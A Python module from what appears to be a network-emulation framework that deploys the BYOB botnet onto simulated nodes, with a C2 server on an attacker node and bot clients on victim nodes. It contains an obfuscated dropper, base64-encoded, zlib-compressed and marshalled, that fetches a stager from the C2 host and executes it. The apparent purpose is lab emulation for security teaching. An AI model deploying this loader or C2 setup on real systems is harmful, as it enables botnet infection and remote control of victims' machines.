#!/usr/bin/env python3
# encoding: utf-8
# __author__ = 'Demon'
from .. Service import Service, Server
from seedsim.core import Node
from typing import List, Dict
import zlib,base64,marshal
import pkgutil

BotnetServerFileTemplates: Dict[str, str] = {}

BotnetServerFileTemplates['payload'] = pkgutil.get_data(__name__, 'config/payload.txt').decode("utf-8")
BotnetServerFileTemplates['stager'] = pkgutil.get_data(__name__, 'config/stager.txt').decode("utf-8")
BotnetServerFileTemplates['dropper'] = """import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))
"""
BotnetServerFileTemplates['start_command'] = """
printf "%s" "waiting for C2 Server network ready ..."
while ! ping -c 1 -n -w 1 {C2ServerIp} &> /dev/null
do
    printf "%c" "."
done
printf "\\n%s\\n"  "Server is ready"
sleep 3
python2 /tmp/BotClient.py
"""

class BotnetServer(Server):
    """!
    @brief The BotnetServer class.
    """

    __node: Node
    __port: int

    def __init__(self, node: Node):
        """!
        @brief BotnetServer constructor.

        @param node node.
        """
        self.__node = node
        self.__port = 445
        try:
            self.__ip = format(self.__node.getInterfaces()[0].getAddress())
        except IndexError:
            print("The Botnet server node has not joined any network, please assign an IP address first.")
            raise

    def setPort(self, port: int):
        """!
        @brief Set C2 port.

        @param port port.
        """
        ## ! todo, not support to change port right now
        self.__port = port


    def install(self):
        """!
        @brief Install the Botnet C2 server.
        """
        self.__node.addSoftware('python2 git cmake python2.7-dev gcc g++ make')
        self.__node.addBuildCommand('git clone https://github.com/malwaredllc/byob.git /tmp/byob/')
        self.__node.addBuildCommand('curl https://bootstrap.pypa.io/get-pip.py -o /tmp/get-pip.py')
        self.__node.addBuildCommand('python2 /tmp/get-pip.py')
        self.__node.addBuildCommand('pip2 install -r /tmp/byob/byob/requirements.txt')
        self.__node.setFile('/tmp/byob/byob/modules/payloads/b6H.py', BotnetServerFileTemplates['payload'].replace("{serverHost}", self.__ip))
        self.__node.setFile('/tmp/byob/byob/modules/stagers/b6H.py', BotnetServerFileTemplates['stager'].replace("{serverHost}", self.__ip))
        self.__node.addStartCommand('cd /tmp/byob/byob/; echo "exit\ny" | python2 server.py --port {} &'.format(self.__port))

    def print(self, indent: int) -> str:
        out = ' ' * indent
        out += 'BotnetServer: as{}/{}\n'.format(self.__node.getAsn(), self.__node.getName())

        return out

class BotnetClient(Server):
    """!
    @brief The BotnetClient class.
    """

    __node: Node
    __port: int

    def __init__(self, node: Node, C2ServerIp: str):
        """!
        @brief BotnetClient constructor.

        @param node node.
        @param C2ServerIp use for connecting C2 server
        """
        self.__c2_server_url = 'http://{}:446//stagers/b6H.py'.format(C2ServerIp)
        self.__c2_server_ip = C2ServerIp
        self.__dropper = BotnetServerFileTemplates['dropper']\
            .format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()"
                                                                      .format(repr(self.__c2_server_url)),2)))))
        self.__node = node
        self.__port = 445

    def setPort(self, port: int):
        """!
        @brief Set HTTP port.

        @param port port.
        """
        ## ! todo, not support to change port right now
        self.__port = port

    def install(self):
        """!
        @brief Install the service.
        """
        self.__node.addSoftware('python2 git cmake python2.7-dev gcc g++ make')
        self.__node.addBuildCommand('git clone https://github.com/malwaredllc/byob.git /tmp/byob/')
        self.__node.addBuildCommand('curl https://bootstrap.pypa.io/get-pip.py -o /tmp/get-pip.py')
        self.__node.addBuildCommand('python2 /tmp/get-pip.py')
        self.__node.addBuildCommand('pip2 install -r /tmp/byob/byob/requirements.txt')
        self.__node.setFile('/tmp/BotClient.py', self.__dropper)
        self.__node.addStartCommand(BotnetServerFileTemplates['start_command'].format(C2ServerIp = self.__c2_server_ip))

    def print(self, indent: int) -> str:
        out = ' ' * indent
        out += 'BotnetClient: as{}/{}\n'.format(self.__node.getAsn(), self.__node.getName())

        return out

class BotnetService(Service):
    """!
    @brief The BotnetService class.
    """

    __servers: List[BotnetServer]

    def __init__(self):
        """!
        @brief BotnetService constructor.
        """
        self.__servers = []
        self.addDependency('Base', False, False)

    def getName(self) -> str:
        return 'BotnetService'

    def installC2(self, node: Node) -> BotnetServer:
        """!
        @brief install C2 server to node
        @param node the node of attacker

        @returns botnet server.
        """
        server: BotnetServer = node.getAttribute('__botnet_service_server')
        if server != None: return server
        server = BotnetServer(node)
        self.__servers.append(server)
        node.setAttribute('__botnet_service_server', server)
        return server

    def installBot(self, node: Node, C2ServerIp: str) -> BotnetClient:
        """!
        @brief install bot client to node

        @param node the node of victim or bot
        @param C2ServerIp the IP of C2 server

        @returns botnet client.
        """
        server: BotnetClient = node.getAttribute('__botnet_service_client')
        if server != None: return server
        server = BotnetClient(node, C2ServerIp)
        self.__servers.append(server)
        node.setAttribute('__botnet_service_client', server)
        return server


    def onRender(self):
        for server in self.__servers:
            server.install()

    def print(self, indent: int) -> str:
        out = ' ' * indent
        out += 'BotnetServiceLayer:\n'

        indent += 4
        out += ' ' * indent

        out += 'Installed Nodes:\n'

        for server in self.__servers:
            out += server.print(indent + 4)

        return out